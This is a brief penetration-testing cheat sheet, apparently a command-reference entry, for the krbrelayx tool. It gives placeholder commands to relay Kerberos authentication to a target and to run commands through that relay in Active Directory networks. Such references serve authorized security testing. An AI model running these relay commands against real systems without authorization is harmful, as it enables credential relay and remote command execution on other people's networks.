# krbrelayx

% Kerberos, krbrelayx, relay

## Kerberos relay
#assessment/AD #attack_type/Coerce_Relay #port/88 #protocol/kerberos #access/Anonymous

Relay kerberos authentication to a remote target.

```bash
krbrelayx.py -t <target-hostname> -smb2support
```

## Execute commands
#assessment/AD #attack_type/Coerce_Relay #port/88 #protocol/kerberos #access/Anonymous

Execute commands along a kerberos authentication relay.

```bash
krbrelayx.py -t <target-hostname> -smb2support -c <command>
```
